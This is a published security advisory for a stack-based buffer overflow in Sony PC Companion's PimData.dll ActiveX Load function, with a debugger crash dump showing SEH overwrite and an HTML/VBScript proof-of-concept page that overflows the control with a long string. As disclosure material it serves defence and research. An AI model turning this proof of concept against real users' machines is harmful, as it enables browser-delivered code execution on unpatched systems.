@@ -1,0 +1,85 @@
+Sony PC Companion 2.1 (Load()) Stack-based Unicode Buffer Overload SEH
+
+
+Vendor: Sony Mobile Communications AB
+Product web page: http://www.sonymobile.com
+Affected version: 2.10.115 (Production 27.1, Build 830)
+                  2.10.108 (Production 26.1, Build 818)
+
+Summary: PC Companion is a computer application that acts as a portal
+to Sony Xperia and operator features and applications, such as phone
+software updates, management of contacts and calendar, media management
+with Media Go, and a backup and restore feature for your phone content.
+
+Desc: The vulnerability is caused due to a boundary error in PimData.dll
+when handling the value assigned to the 'File' item in the Load function
+and can be exploited to cause a stack-based buffer overflow via an overly
+long string which may lead to execution of arbitrary code on the affected
+machine.
+
+
+------------------------------------------------------------------------------
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(59c.162c): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=5f392b80 ecx=75b1de28 edx=0019dd59 esi=00000000 edi=002891c4
+eip=75b1dca5 esp=0019dfa0 ebp=0019e01c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNEL32!FormatMessageA+0x13c85:
+75b1dca5 cc              int     3
+0:000> !exchain
+0019e00c: KERNEL32!RegSaveKeyExA+3e9 (75b49b72)
+Invalid exception stack at 00420042
+0:000> d edi
+002891c4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+002891d4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+002891e4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+002891f4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00289204  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00289214  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00289224  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+00289234  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0:000>
+
+------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN) 32bit
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5118
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5118.php
+
+http://cwe.mitre.org/data/definitions/121.html
+
+
+09.11.2012
+
+---
+
+
+<html>
+<body>
+<object classid='clsid:EEA36793-F574-4CC1-8690-60E3511CFEAA' id='overrun' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\Sony\Sony PC Companion\PimData.dll"
+prototype  = "Sub Load ( ByVal File As String )"
+memberName = "Load"
+progid     = "PimDataLib.DataItemCollection"
+argCount   = 1
+
+File=String(262, "A") + "BB" + String(1000, "C")
+
+'             ^          ^              ^
+'             |          |              |
+'----------- junk ----- nseh -------- junk ------
+
+overrun.Load File
+
+</script>
+</body>
+</html>
